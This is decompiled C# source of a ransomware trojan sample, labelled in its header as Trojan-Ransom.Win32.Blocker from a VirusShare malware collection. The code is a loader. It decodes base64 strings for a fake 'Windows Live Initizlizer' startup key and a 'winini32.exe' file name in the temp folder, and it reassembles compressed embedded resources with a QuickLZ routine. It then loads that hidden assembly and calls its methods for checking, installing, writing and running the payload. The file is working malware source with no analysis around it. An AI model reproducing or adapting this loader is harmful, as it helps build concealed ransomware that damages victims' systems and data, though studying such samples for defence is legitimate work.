// Decompiled with JetBrains decompiler
// Type: Swagger
// Assembly: andro 21-03-2013, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74EEF0C2-4E3D-4EBB-AC07-07B05E9270E3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.aynw-081fb3617af2f425290ab0583b97eca9b63f05eb.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal class Swagger
{
  public static List<Thread> Threads = new List<Thread>();
  public static byte[] Running;
  public static string StartupPath = Path.GetTempPath();
  public static string StartupKey = "Windows Live Initizlizer for 32bit";
  public static string path = Process.GetCurrentProcess().MainModule.FileName;

  private static void Main(string[] args)
  {
    Swagger.Running = Swagger.Dew(Swagger.Decode("WmFpanouZmd0"));
    if (!(bool) Swagger.Invoker((object) new object[3]
    {
      (object) "Check",
      (object) Swagger.StartupKey,
      (object) Swagger.path
    }))
    {
      Swagger.AddThread(new object[3]
      {
        (object) "Begin",
        (object) Swagger.Decode("V2luZG93cyBMaXZlIEluaXRpemxpemVyIGZvciAzMmJpdA=="),
        (object) (Path.GetTempPath() + Swagger.Decode("XFx3aW5pbmkzMi5leGU="))
      });
      Swagger.AddThread(new object[6]
      {
        (object) "Scribe",
        (object) File.ReadAllBytes(Swagger.path),
        (object) false,
        (object) Swagger.Decode("d2luaW5pMzIuZXhl"),
        (object) true,
        (object) 0
      });
    }
    else
    {
      Swagger.AddThread(new object[1]
      {
        (object) "SetYouFree"
      });
      Swagger.AddThread(new object[5]
      {
        (object) "Run",
        (object) Swagger.path,
        (object) "",
        (object) Swagger.Dew(Swagger.Decode("WXZ6aGFoLmZndA==")),
        (object) false
      });
    }
    if (Swagger.StartupKey == "")
      Swagger.AddThread(new object[1]
      {
        (object) "SetYouFree"
      });
    foreach (Thread thread in Swagger.Threads)
      thread.Join();
  }

  private static void AddThread(object[] parameters)
  {
    Thread thread = new Thread(new ParameterizedThreadStart(Swagger.Invoke));
    thread.SetApartmentState(ApartmentState.STA);
    thread.Start((object) parameters);
    Swagger.Threads.Add(thread);
  }

  private static void Invoke(object tr) => Swagger.Invoker(tr);

  private static object Invoker(object tr)
  {
    object[] sourceArray = (object[]) tr;
    object[] objArray = new object[sourceArray.Length - 1];
    if (sourceArray.Length > 1)
      Array.Copy((Array) sourceArray, 1, (Array) objArray, 0, objArray.Length);
    string str = (string) sourceArray[0];
    foreach (MethodInfo method in Assembly.Load(Swagger.Running).GetType("Ax").GetMethods())
    {
      ParameterInfo[] parameters = method.GetParameters();
      if (!(method.Name != str))
      {
        for (int index = 0; index < objArray.Length; ++index)
        {
          if ((object) parameters[index].ParameterType == (object) objArray[index].GetType())
            ;
        }
        return method.Invoke((object) null, objArray);
      }
    }
    return (object) null;
  }

  private static byte[] ReadFully(Stream stream)
  {
    byte[] buffer = new byte[stream.Length];
    stream.Read(buffer, 0, buffer.Length);
    stream.Close();
    return buffer;
  }

  public static byte[] Dew(string rName)
  {
    List<byte> byteList = new List<byte>();
    for (int maxValue = int.MaxValue; maxValue >= 0; --maxValue)
    {
      try
      {
        string name = rName.Replace(".fgt", "") + (object) maxValue + ".fgt";
        byteList.AddRange((IEnumerable<byte>) Swagger.ReadFully(Assembly.GetExecutingAssembly().GetManifestResourceStream(name)));
      }
      catch
      {
        break;
      }
    }
    return Swagger.QuickLZ.Decompress(byteList.ToArray());
  }

  private static string Decode(string input) => Encoding.GetEncoding(1252).GetString(Convert.FromBase64String(input));

  private static class QuickLZ
  {
    public const int QLZ_VERSION_MAJOR = 1;
    public const int QLZ_VERSION_MINOR = 5;
    public const int QLZ_VERSION_REVISION = 0;
    public const int QLZ_STREAMING_BUFFER = 0;
    public const int QLZ_MEMORY_SAFE = 0;
    private const int HASH_VALUES = 4096;
    private const int MINOFFSET = 2;
    private const int UNCONDITIONAL_MATCHLEN = 6;
    private const int UNCOMPRESSED_END = 4;
    private const int CWORD_LEN = 4;
    private const int DEFAULT_HEADERLEN = 9;
    private const int QLZ_POINTERS_1 = 1;
    private const int QLZ_POINTERS_3 = 16;

    private static int headerLen(byte[] source) => ((int) source[0] & 2) == 2 ? 9 : 3;

    public static int sizeDecompressed(byte[] source) => Swagger.QuickLZ.headerLen(source) == 9 ? (int) source[5] | (int) source[6] << 8 | (int) source[7] << 16 | (int) source[8] << 24 : (int) source[2];

    public static byte[] Decompress(byte[] source)
    {
      int length = Swagger.QuickLZ.sizeDecompressed(source);
      int index1 = Swagger.QuickLZ.headerLen(source);
      int index2 = 0;
      uint num1 = 1;
      byte[] numArray1 = new byte[length];
      int[] numArray2 = new int[4096];
      byte[] numArray3 = new byte[4096];
      int num2 = length - 6 - 4 - 1;
      int index3 = -1;
      uint num3 = 0;
      int num4 = (int) source[0] >> 2 & 3;
      if (num4 != 1 && num4 != 3)
        throw new ArgumentException("C# version only supports level 1 and 3");
      if (((int) source[0] & 1) != 1)
      {
        byte[] destinationArray = new byte[length];
        Array.Copy((Array) source, Swagger.QuickLZ.headerLen(source), (Array) destinationArray, 0, length);
        return destinationArray;
      }
      while (true)
      {
        if (num1 == 1U)
        {
          num1 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
          index1 += 4;
          if (index2 <= num2)
            num3 = num4 != 1 ? (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24) : (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
        }
        if (((int) num1 & 1) == 1)
        {
          num1 >>= 1;
          uint index4;
          uint num5;
          if (num4 == 1)
          {
            int index5 = (int) num3 >> 4 & 4095;
            index4 = (uint) numArray2[index5];
            if (((int) num3 & 15) != 0)
            {
              num5 = (uint) (((int) num3 & 15) + 2);
              index1 += 2;
            }
            else
            {
              num5 = (uint) source[index1 + 2];
              index1 += 3;
            }
          }
          else
          {
            uint num6;
            if (((int) num3 & 3) == 0)
            {
              num6 = (num3 & (uint) byte.MaxValue) >> 2;
              num5 = 3U;
              ++index1;
            }
            else if (((int) num3 & 2) == 0)
            {
              num6 = (num3 & (uint) ushort.MaxValue) >> 2;
              num5 = 3U;
              index1 += 2;
            }
            else if (((int) num3 & 1) == 0)
            {
              num6 = (num3 & (uint) ushort.MaxValue) >> 6;
              num5 = (uint) (((int) (num3 >> 2) & 15) + 3);
              index1 += 2;
            }
            else if (((int) num3 & (int) sbyte.MaxValue) != 3)
            {
              num6 = num3 >> 7 & 131071U;
              num5 = (uint) (((int) (num3 >> 2) & 31) + 2);
              index1 += 3;
            }
            else
            {
              num6 = num3 >> 15;
              num5 = (uint) (((int) (num3 >> 7) & (int) byte.MaxValue) + 3);
              index1 += 4;
            }
            index4 = (uint) ((ulong) index2 - (ulong) num6);
          }
          numArray1[index2] = numArray1[(IntPtr) index4];
          numArray1[index2 + 1] = numArray1[(IntPtr) (index4 + 1U)];
          numArray1[index2 + 2] = numArray1[(IntPtr) (index4 + 2U)];
          for (int index6 = 3; (long) index6 < (long) num5; ++index6)
            numArray1[index2 + index6] = numArray1[(long) index4 + (long) index6];
          index2 += (int) num5;
          if (num4 == 1)
          {
            uint num7 = (uint) ((int) numArray1[index3 + 1] | (int) numArray1[index3 + 2] << 8 | (int) numArray1[index3 + 3] << 16);
            while ((long) index3 < (long) index2 - (long) num5)
            {
              ++index3;
              int index7 = ((int) (num7 >> 12) ^ (int) num7) & 4095;
              numArray2[index7] = index3;
              numArray3[index7] = (byte) 1;
              num7 = (uint) ((ulong) (num7 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) numArray1[index3 + 3] << 16));
            }
            num3 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
          }
          else
            num3 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
          index3 = index2 - 1;
        }
        else if (index2 <= num2)
        {
          numArray1[index2] = source[index1];
          ++index2;
          ++index1;
          num1 >>= 1;
          if (num4 == 1)
          {
            while (index3 < index2 - 3)
            {
              ++index3;
              int num8 = (int) numArray1[index3] | (int) numArray1[index3 + 1] << 8 | (int) numArray1[index3 + 2] << 16;
              int index8 = (num8 >> 12 ^ num8) & 4095;
              numArray2[index8] = index3;
              numArray3[index8] = (byte) 1;
            }
            num3 = (uint) ((ulong) (num3 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16));
          }
          else
            num3 = (uint) ((ulong) (num3 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16) | (ulong) ((int) source[index1 + 3] << 24));
        }
        else
          break;
      }
      while (index2 <= length - 1)
      {
        if (num1 == 1U)
        {
          index1 += 4;
          num1 = 2147483648U;
        }
        numArray1[index2] = source[index1];
        ++index2;
        ++index1;
        num1 >>= 1;
      }
      return numArray1;
    }
  }
}
